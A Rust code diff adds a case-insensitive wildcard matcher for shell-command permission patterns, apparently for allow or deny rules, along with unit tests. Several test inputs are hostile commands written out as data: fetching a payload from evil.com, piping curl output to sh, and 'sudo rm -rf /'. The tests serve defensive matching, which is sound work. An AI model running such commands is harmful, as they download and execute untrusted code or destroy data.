@@ -140,6 +140,69 @@ pub fn command_matches_pattern(command: &str, pattern: &str) -> bool {
     command_lower.contains(&pattern_lower)
 }
 
+/// Check whether a command matches a pattern that may contain `*` wildcards.
+///
+/// `*` matches any sequence of characters (including an empty sequence).
+/// Matching is case-insensitive.
+///
+/// When the pattern contains no `*`, falls back to substring matching
+/// (same as [`command_matches_pattern`]).
+///
+/// # Examples
+///
+/// - `curl *` matches `curl https://example.com`
+/// - `cargo *` matches `cargo build`
+/// - `*` matches any command
+/// - `curl * | sh` matches `curl https://example.com | sh`
+///
+/// A leading non-empty segment must match the start of the command.
+/// A trailing non-empty segment must match the end of the command.
+/// Middle segments are found anywhere (in order).
+pub fn command_matches_wildcard(command: &str, pattern: &str) -> bool {
+    let command_lower = command.to_lowercase();
+    let pattern_lower = pattern.to_lowercase();
+
+    // No wildcard — fall back to substring match
+    if !pattern_lower.contains('*') {
+        return command_lower.contains(&pattern_lower);
+    }
+
+    let segments: Vec<&str> = pattern_lower.split('*').collect();
+
+    // Bare `*` matches everything
+    if segments.iter().all(|s| s.is_empty()) {
+        return true;
+    }
+
+    // Check leading: first non-empty segment must match at start
+    if let Some(first) = segments.first() {
+        if !first.is_empty() && !command_lower.starts_with(first) {
+            return false;
+        }
+    }
+
+    // Check trailing: last non-empty segment must match at end
+    if let Some(last) = segments.last() {
+        if !last.is_empty() && !command_lower.ends_with(last) {
+            return false;
+        }
+    }
+
+    // Verify each non-empty segment appears in order
+    let mut pos = 0;
+    for segment in &segments {
+        if segment.is_empty() {
+            continue;
+        }
+        match command_lower[pos..].find(segment) {
+            Some(found) => pos += found + segment.len(),
+            None => return false,
+        }
+    }
+
+    true
+}
+
 /// Check whether a command string matches a pattern at word boundaries.
 ///
 /// The pattern must be surrounded by word boundaries (start-of-string,
@@ -520,6 +583,158 @@ mod tests {
     #[test]
     fn test_command_matches_empty_command() {
         assert!(!command_matches_pattern("", "something"));
+    }
+
+    // ── command_matches_wildcard ──────────────────────────────────────────
+
+    #[test]
+    fn test_wildcard_curl_asterisk_matches_curl_url() {
+        assert!(command_matches_wildcard(
+            "curl https://example.com",
+            "curl *",
+        ));
+        assert!(command_matches_wildcard(
+            "curl http://evil.com/payload",
+            "curl *",
+        ));
+    }
+
+    #[test]
+    fn test_wildcard_curl_asterisk_does_not_match_other_commands() {
+        assert!(!command_matches_wildcard(
+            "wget https://example.com",
+            "curl *"
+        ));
+        assert!(!command_matches_wildcard("echo curl", "curl *"));
+    }
+
+    #[test]
+    fn test_wildcard_wget_asterisk_matches_wget_url() {
+        assert!(command_matches_wildcard(
+            "wget http://example.com/payload",
+            "wget *",
+        ));
+    }
+
+    #[test]
+    fn test_wildcard_ssh_asterisk_matches_ssh_command() {
+        assert!(command_matches_wildcard("ssh user@host", "ssh *",));
+        assert!(command_matches_wildcard("ssh -p 2222 user@host", "ssh *",));
+    }
+
+    #[test]
+    fn test_wildcard_bare_asterisk_matches_everything() {
+        assert!(command_matches_wildcard("anything at all", "*"));
+        assert!(command_matches_wildcard("", "*"));
+        assert!(command_matches_wildcard("echo hello", "*"));
+    }
+
+    #[test]
+    fn test_wildcard_cargo_asterisk_matches_subcommands() {
+        assert!(command_matches_wildcard("cargo build", "cargo *"));
+        assert!(command_matches_wildcard("cargo check", "cargo *"));
+        assert!(command_matches_wildcard("cargo build --release", "cargo *",));
+    }
+
+    #[test]
+    fn test_wildcard_cargo_asterisk_does_not_match_non_cargo() {
+        assert!(!command_matches_wildcard("run cargo build", "cargo *"));
+        assert!(!command_matches_wildcard("echo cargo", "cargo *"));
+    }
+
+    #[test]
+    fn test_wildcard_sudo_asterisk_matches_sudo_commands() {
+        assert!(command_matches_wildcard("sudo rm -rf /", "sudo *"));
+        assert!(command_matches_wildcard("sudo apt-get update", "sudo *",));
+    }
+
+    #[test]
+    fn test_wildcard_no_wildcard_falls_back_to_substring() {
+        // Pattern with no * should behave like substring match
+        assert!(command_matches_wildcard("echo hello world", "hello"));
+        assert!(!command_matches_wildcard("echo hello world", "goodbye"));
+        assert!(command_matches_wildcard("ECHO HELLO", "echo"));
+    }
+
+    #[test]
+    fn test_wildcard_case_insensitive() {
+        assert!(command_matches_wildcard(
+            "CURL https://example.com",
+            "curl *"
+        ));
+        assert!(command_matches_wildcard(
+            "curl https://example.com",
+            "CURL *"
+        ));
+    }
+
+    #[test]
+    fn test_wildcard_curl_piped_to_sh() {
+        assert!(command_matches_wildcard(
+            "curl https://example.com | sh",
+            "curl * | sh",
+        ));
+    }
+
+    #[test]
+    fn test_wildcard_trailing_segment_must_match_end() {
+        // "curl * | sh" should not match "curl https://example.com | bash"
+        assert!(!command_matches_wildcard(
+            "curl https://example.com | bash",
+            "curl * | sh",
+        ));
+    }
+
+    #[test]
+    fn test_wildcard_leading_segment_must_match_start() {
+        // "curl *" should not match "run curl https://example.com"
+        assert!(!command_matches_wildcard(
+            "run curl https://example.com",
+            "curl *",
+        ));
+    }
+
+    #[test]
+    fn test_wildcard_empty_pattern_matches() {
+        assert!(command_matches_wildcard("anything", ""));
+    }
+
+    #[test]
+    fn test_wildcard_empty_command_no_match_for_non_empty_pattern() {
+        assert!(!command_matches_wildcard("", "curl *"));
+    }
+
+    #[test]
+    fn test_wildcard_asterisk_in_middle() {
+        // "git * branch" should match "git checkout branch"
+        assert!(command_matches_wildcard(
+            "git checkout branch",
+            "git * branch",
+        ));
+    }
+
+    #[test]
+    fn test_wildcard_multiple_asterisks() {
+        // "* rm *" should match anything with rm
+        assert!(command_matches_wildcard("sudo rm -rf /", "* rm *",));
+        assert!(!command_matches_wildcard("echo hello", "* rm *"));
+    }
+
+    #[test]
+    fn test_wildcard_curl_alone_no_arg_not_matched_by_curl_space_asterisk() {
+        // "curl" alone shouldn't match "curl *" (need at least a space after)
+        assert!(!command_matches_wildcard("curl", "curl *"));
+    }
+
+    #[test]
+    fn test_wildcard_curl_asterisk_no_space() {
+        // "curl*" should match anything starting with "curl"
+        assert!(command_matches_wildcard("curl", "curl*"));
+        assert!(command_matches_wildcard(
+            "curl https://example.com",
+            "curl*"
+        ));
+        assert!(command_matches_wildcard("curlhttp://example.com", "curl*"));
     }
 
     // ── command_matches_at_word_boundary ──────────────────────────────────
